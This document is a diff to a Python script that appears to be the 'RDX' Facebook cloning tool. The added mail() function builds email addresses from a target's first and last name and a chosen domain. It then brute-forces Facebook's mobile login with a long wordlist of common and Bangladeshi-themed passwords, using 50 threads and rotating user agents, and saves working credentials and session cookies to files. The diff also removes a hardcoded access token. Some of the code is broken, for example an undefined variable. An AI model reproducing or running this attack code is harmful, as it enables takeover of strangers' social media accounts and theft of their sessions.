@@ -411,6 +411,17 @@ logo32 =("""
 \033[0;92m╚══╝╚╝╚═╝╚╝─╚╝╚╝─╚═╝
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
 
+logo33 =("""
+\033[0;92m███████╗    ███╗   ███╗ █████╗ ██╗██╗     
+\033[0;92m██╔════╝    ████╗ ████║██╔══██╗██║██║     
+\033[0;92m█████╗█████╗██╔████╔██║███████║██║██║     
+\033[0;92m██╔══╝╚════╝██║╚██╔╝██║██╔══██║██║██║     
+\033[0;92m███████╗    ██║ ╚═╝ ██║██║  ██║██║███████╗
+\033[0;92m╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
+jalan('\033[1;97m====================================================')""")
+
+
+
 
 
 logo53 =("""
@@ -10515,7 +10526,7 @@ def part():
 	elif option =='1':
 		Subscraption()
 	elif option =='2':
-		Rdx2x()
+		Rdx3x()
 	elif option =='3':
 		details()
 	elif option =='0':
@@ -10544,11 +10555,11 @@ def login():
     time.sleep(0.05)
     print('\x1b[1;97m«-----------------\x1b[1;92mRdx-76\x1b[1;97m---------------»')
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[1]\x1b[1;92m Fast Cloning Without fb id \x1b[1;91m[New Update]')
+    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[1]\x1b[1;92m Fast Cloning 26 Country fb id \x1b[1;91m[New Update]')
     time.sleep(0.05)
-    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[2]\x1b[1;93m Login only new Facebook ID ")
+    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[2]\x1b[1;93m Clone Random Facebook ID ")
     time.sleep(0.05)
-    print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[3]\x1b[1;95m Login  Using Token Update by Rdx')
+    print("\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[3]\x1b[1;95m Clone  Using E-mail Account \x1b[1;91m[Very Slow] ")
     time.sleep(0.05)
     print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[4]\x1b[1;97m Get Access Token App Fb')
     time.sleep(0.05)
@@ -10569,9 +10580,9 @@ def pilih_login():
 	elif peak =='1':
 		Rdx1x()
 	elif peak =='2':
-		Rdx3x()
+		Rdx2x()
 	elif peak =='3':
-		tokenz()
+		mail()
 	elif peak =='4':
 		os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 		login()
@@ -11129,58 +11140,54 @@ def iran():
 		input("\n[ Back ]")
 		Rdx1x()
 
-def main():
+
+
+def mail():
 	user=[]
-	twf =[]
-	os.getuid
-	os.geteuid
-	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	os.system('clear')
+	print(logo)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
+	print(logo1)
+	limit = int(input('\033[1;92m[✔]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
 	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
 		user.append(nmp)
-	print(logo7)
-	print("\x1b[1;97m0175,0165,0191, 0192, 0193, 0194, 0195, 017,019,013,014,016,170,180,190,150,015,130,140,018,0196, 0197, 0198, 0199")
-	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+880"
-		os.system('clear')
-		print(logo53)
-		os.system('clear')
-		print(logo7)
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
-	passx = 0
-	RdxID = []
-	print("")
-	for bilal in range(passx):
-		pww = "passbd()"
-		RdxID.append(pww)
+	os.system('clear')
+	print(logo33)
+	code = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TERGET FARST NAME: ')
+	codex = input('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]TERGET LAST NAME :  ')
+	print('\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]example Doamin :\033[1;93m@gmail.com,\033[1;96m@yahoo.com ')
+	doamin = input('\033[1;96m[\033[1;93m📧\033[1;96m]\033[1;94mINPUT DOMING : ')
 	with ThreadPool(max_workers=50) as manshera:
-		clear()
+		os.system('clear')
+		print(logo2)
 		tl = str(len(user))
 		jalan('\033[1;97m====================================================')
 		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
 		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
 		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
 		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
-		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Slow Speed Cloning')
 		jalan('\033[1;97m====================================================')
-		for pww in user:
-			pwx = "pww"
-			uid = code+random.choice(ugen)
-			for pro in RdxID:
-				pwx.append(pro)
-				pwx.append(pww)
-			manshera.submit(rcrackx,uid,pwx,tl)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mFirst Name       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mLast Name       \033[1;34m: \033[0;97m"+codex)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = code+codex+co+doamin
+			pwx = [code,codex,code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+cod,codex+cod+co,code+codex+co,code+cod+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackm,uid,pwx,tl)
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('\x1b[1;94mCrack process has been completed')
-	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK.txt,\x1b[1;91mⓇDX-CP.txt')
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 
-
-def rcrackx(uid,pwx,tl):
+def rcrackm(uid,pwx,tl):
 	#print(user)
 	global loop
 	global cps
@@ -11188,7 +11195,7 @@ def rcrackx(uid,pwx,tl):
 	global proxy
 	try:
 		for ps in pwx:
-			pro = random.choice(pww)
+			pro = random.choice(ugen)
 			session = requests.Session()
 			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
 			log_data = {
@@ -11223,195 +11230,24 @@ def rcrackx(uid,pwx,tl):
 				cid = coki[7:22]
 				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
 				cek_apk(session,coki)
-				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				open('/sdcard/RDX/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
-				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/RDX/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK-{xr}%s{x}]\033[1;92m[CP-{xr}%s{x}] \r'%(bi,loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
-	
-	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-	print('\x1b[1;94mCrack process has been completed')
-	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
-	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 
-		
-def tokenz():
-	os.system('clear')
-	print(logo)
-	toket = input('\n   \033[0;92m[?] \033[0;92mToken >>>\033[0;92mCopy👉 \033[0;92mEAAAAUaZA8jlABAFpDXx3FwAnUMnKBSR7hoNeO0XK0qSocPc0dxfrP0L13QVa0yXMaWKNzx8M5ZC6Ajpq50uSkfNpSHlX8kDUonlLXWFuP32hbPWjPLyoZAjZC4wKKnDTcYKHm7YsuHd7PJYzfrCZCb373OVWXeX16Vv50fFwdSiO7RZA1L152EBsXz5mgDZBvIZD \033[0;92m👈 With out fb ID free login Token Paste & Enter👉 \033[1;37m ')
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		zedd = open("login.txt", 'w')
-		zedd.write(toket)
-		zedd.close()
-		menu()
-	except KeyError:
-		print("\033[0;92m[!] Wrong")
-		e = input('\n   \033[0;92m[?] \033[0;92mWant to pick up token? >>>\033[0;92m[y/n]: \033[1;37m ')
-		if e =="":
-			exit()
-		elif e =="y":
-			login()
-		else:
-			exit()
-
-def passbd():
-	if pww == "RT@oAwy5t":
-		RdxID.append(pww)
-	elif pww == "RE9iKR=GG":
-		RdxID.append(pww)
-	elif pww == "zr%Xd665a":
-		RdxID.append(pww)
-	elif pww == "joybangla":
-		RdxID.append(pww)
-	elif pww == "octopus":
-		RdxID.append(pww)
-	elif pww == "i love you":
-		RdxID.append(pww)
-	elif pww == "iloveyou":
-		RdxID.append(pww)
-	elif pww == "Iloveyou":
-		RdxID.append(pww)
-	elif pww == "I Love You":
-		RdxID.append(pww)
-	elif pww == "passwordnai":
-		RdxID.append(pww)
-	elif pww == "janinah":
-		RdxID.append(pww)
-	elif pww == "bongobondhu":
-		RdxID.append(pww)
-	elif pww == "tuipagol":
-		RdxID.append(pww)
-	elif pww == "tumishuduamr":
-		RdxID.append(pww)
-	elif pww == "monvalonei":
-		RdxID.append(pww)
-	elif pww == "bangladesh":
-		RdxID.append(pww)
-	elif pww == "shonarbangla":
-		RdxID.append(pww)
-	elif pww == "valotheko":
-		RdxID.append(pww)
-	elif pww == "mymensing":
-		RdxID.append(pww)
-	elif pww == "gazipur":
-		RdxID.append(pww)
-	elif pww == "australia":
-		RdxID.append(pww)
-	elif pww == "amarjan":
-		RdxID.append(pww)
-	elif pww == "january":
-		RdxID.append(pww)
-	elif pww == "boshonto":
-		RdxID.append(pww)
-	elif pww == "shunabondhu":
-		RdxID.append(pww)
-	elif pww == "akashnil":
-		RdxID.append(pww)
-	elif pww == "abujuber":
-		RdxID.append(pww)
-	elif pww == "siamhosen":
-		RdxID.append(pww)
-	elif pww == "rajonmia":
-		RdxID.append(pww)
-	elif pww == "rokunmia":
-		RdxID.append(pww)
-	elif pww == "khan123":
-		RdxID.append(pww)
-	elif pww == "pubgmobile":
-		RdxID.append(pww)
-	elif pww == "Pubgmobile":
-		RdxID.append(pww)
-	elif pww == "Pubg123":
-		RdxID.append(pww)
-	elif pww == "pubg123":
-		RdxID.append(pww)
-	elif pww == "pubg1234":
-		RdxID.append(pww)
-	elif pww == "Pubg1234":
-		RdxID.append(pww)
-	elif pww == "freefirel123":
-		RdxID.append(pww)
-	elif pww == "Freefire123":
-		RdxID.append(pww)
-	elif pww == "freefire":
-		RdxID.append(pww)
-	elif pww == "Freefire":
-		RdxID.append(pww)
-	elif pww == "Password":
-		RdxID.append(pww)
-	elif pww == "monster":
-		RdxID.append(pww)
-	elif pww == "playboy":
-		RdxID.append(pww)
-	elif pww == "please":
-		RdxID.append(pww)
-	elif pww == "babukhaiso":
-		RdxID.append(pww)
-	elif pww == "aimontumakedilam":
-		RdxID.append(pww)
-	elif pww == "paglahawa":
-		RdxID.append(pww)
-	elif pww == "sunnyleane":
-		RdxID.append(pww)
-	elif pww == "chottogram":
-		RdxID.append(pww)
-	elif pww == "iskonbangladesh":
-		RdxID.append(pww)
-	elif pww == "aminastik":
-		RdxID.append(pww)
-	elif pww == "shudhutumi":
-		RdxID.append(pww)
-	elif pww == "bolbona":
-		RdxID.append(pww)
-	elif pww == "janina":
-		RdxID.append(pww)
-	elif pww == "kisuina":
-		RdxID.append(pww)
-	elif pww == "kisuinah":
-		RdxID.append(pww)
-	elif pww == "shundori":
-		RdxID.append(pww)
-	elif pww == "baburma":
-		RdxID.append(pww)
-	elif pww == "amirtumi":
-		RdxID.append(pww)
-	elif pww == "rajarani":
-		RdxID.append(pww)
-	elif pww == "passwordki":
-		RdxID.append(pww)
-	elif pww == "mafkor":
-		RdxID.append(pww)
-	elif pww == "1234567":
-		RdxID.append(pww)
-	elif pww == "1234987":
-		RdxID.append(pww)
-	elif pww == "angel123":
-		RdxID.append(pww)
-	elif pww == "joy4567":
-		RdxID.append(pww)
-	elif pww == "Bangladesh":
-		RdxID.append(pww)
-	elif pww == "password":
-		RdxID.append(pww)
-	elif pww == "1234567890":
-		RdxID.append(pww)
-	else:
-		passbd()
 
 
 try:
